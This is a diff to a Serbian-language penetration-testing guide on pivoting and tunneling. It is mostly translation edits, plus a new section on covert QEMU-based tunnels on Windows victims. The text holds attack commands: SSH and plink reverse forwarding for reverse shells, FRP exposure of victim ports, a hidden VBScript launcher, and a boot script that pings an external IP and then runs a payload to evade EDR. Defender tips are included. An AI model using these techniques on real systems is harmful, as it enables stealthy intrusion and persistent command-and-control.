@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Lokalni port --> Kompromitovani host (SSH) --> Treća_kutija:Port
+Lokalni port --> Kompromitovani host (SSH) --> Treća_boks:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -55,9 +55,9 @@ Lokalni port --> Kompromitovani host (SSH) --> Gde god
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Обратно прослеђивање порта
+### Reverse Port Forwarding
 
-Ово је корисно за добијање обрнутог шелла са интерних хостова преко DMZ-а до вашег хоста:
+Ovo je korisno za dobijanje obrnute ljuske sa internih hostova kroz DMZ do vašeg hosta:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Bezbednost – Terrapin napad (CVE-2023-48795)**
-> Napad na downgrade Terrapin iz 2023. godine može omogućiti napadaču u sredini da manipuliše ranim SSH rukovanjem i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` algoritme u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tuneli.
+> Napad Terrapin degradacije iz 2023. godine može omogućiti napadaču "man-in-the-middle" da manipuliše ranim SSH rukovanjem i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` algoritme u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tuneli.
 
 ## SSHUTTLE
 
@@ -179,7 +179,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Možete ga preuzeti sa stranice za izdanja [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Morate koristiti **istu verziju za klijenta i server**
+Morate koristiti **istu verziju za klijent i server**
 
 ### socks
 ```bash
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 To je kao konzolna verzija PuTTY (opcije su vrlo slične ssh klijentu).
 
-Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo mogli imati obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
+Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo imali obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -347,7 +347,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Morate imati **RDP pristup preko sistema**.\
+Potrebno je imati **RDP pristup preko sistema**.\
 Preuzmite:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz funkcije Remote Desktop Service u Windows-u. DVC je odgovoran za **tunelovanje paketa preko RDP veze**.
@@ -379,7 +379,7 @@ U **Profile -> Proxification Rules** dodajte ime programa koji želite da proksi
 ## NTLM proksi zaobilaženje
 
 Prethodno pomenuti alat: **Rpivot**\
-**OpenVPN** takođe može da ga zaobiđe, postavljajući ove opcije u konfiguracionom fajlu:
+**OpenVPN** takođe može da ga zaobiđe, postavljanjem ovih opcija u konfiguracionom fajlu:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -387,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Ova alatka se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
+Ovaj alat se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
 Na primer, prosledite port 443.
 ```
 Username Alice
@@ -396,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega kroz port 2222 napadača.\
+Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega preko napadačkog porta 2222.\
 Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, a napadač sluša na portu 2222.
 
 ## YARP
@@ -446,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Promena DNS u proxychains
 
-Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **default-u** DNS server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
+Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **defaultu**, **DNS** server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
 
 ## Tunneli u Go
 
@@ -574,7 +574,7 @@ Pokrenite konektor:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Zbog toga što sav saobraćaj napušta host **izlazno preko 443**, Cloudflared tuneli su jednostavan način da se zaobiđu ulazni ACL-ovi ili NAT granice. Budite svesni da se binarni fajl obično pokreće sa povišenim privilegijama – koristite kontejnere ili `--user` flag kada je to moguće.
+Zato što sav saobraćaj napušta host **izlazno preko 443**, Cloudflared tuneli su jednostavan način da se zaobiđu ulazni ACL-ovi ili NAT granice. Budite svesni da se binarni fajl obično pokreće sa povišenim privilegijama – koristite kontejnere ili `--user` flag kada je to moguće.
 
 ## FRP (Fast Reverse Proxy)
 
@@ -608,11 +608,69 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Gore navedena komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** bez implementacije dodatnih alata – idealno za pivotiranje koristeći resurse na terenu.
+Gore navedena komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** bez implementacije dodatnih alata – idealno za pivotiranje koje koristi resurse na terenu.
+
+## Tajni VM-bazirani tuneli sa QEMU
+
+QEMU-ova mrežna podrška u korisničkom režimu (`-netdev user`) podržava opciju pod nazivom `hostfwd` koja **vezuje TCP/UDP port na *hostu* i prosleđuje ga u *gosta***. Kada gost pokrene punu SSH demon, pravilo hostfwd vam daje jednokratni SSH jump box koji potpuno živi unutar ephemerne VM – savršeno za skrivanje C2 saobraćaja od EDR-a jer sve zlonamerne aktivnosti i datoteke ostaju na virtuelnom disku.
+
+### Brza jedna linija
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• Komanda iznad pokreće **Tiny Core Linux** sliku (`tc.qcow2`) u RAM-u.  
+• Port **2222/tcp** na Windows hostu se transparentno prosleđuje na **22/tcp** unutar gosta.  
+• Sa stanovišta napadača, cilj jednostavno izlaže port 2222; svi paketi koji do njega stignu se obrađuju od strane SSH servera koji radi u VM-u.  
+
+### Pokretanje neprimetno kroz VBScript
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+Pokretanje skripte sa `cscript.exe //B update.vbs` drži prozor skrivenim.
+
+### U gostu postojanost
+
+Budući da je Tiny Core bezdržavni, napadači obično:
+
+1. Postavljaju payload na `/opt/123.out`
+2. Dodaju u `/opt/bootlocal.sh`:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. Dodaju `home/tc` i `opt` u `/opt/filetool.lst` tako da se payload spakuje u `mydata.tgz` prilikom gašenja.
+
+### Zašto ovo izbegava detekciju
+
+• Samo dva nesigurna izvršna fajla (`qemu-system-*.exe`) dodiruju disk; nijedni drajveri ili servisi nisu instalirani.
+• Bezbednosni proizvodi na hostu vide **benigni loopback saobraćaj** (stvarni C2 se završava unutar VM-a).
+• Skeneri memorije nikada ne analiziraju prostor malicioznog procesa jer se nalazi u drugom OS-u.
+
+### Saveti za Defender
+
+• Upozorite na **neočekivane QEMU/VirtualBox/KVM binarne fajlove** u putanjama koje korisnik može pisati.
+• Blokirajte izlazne konekcije koje potiču od `qemu-system*.exe`.
+• Tražite retke portove koji slušaju (2222, 10022, …) koji se vezuju odmah nakon pokretanja QEMU.
+
+---
 
 ## Ostali alati za proveru
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## Reference
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
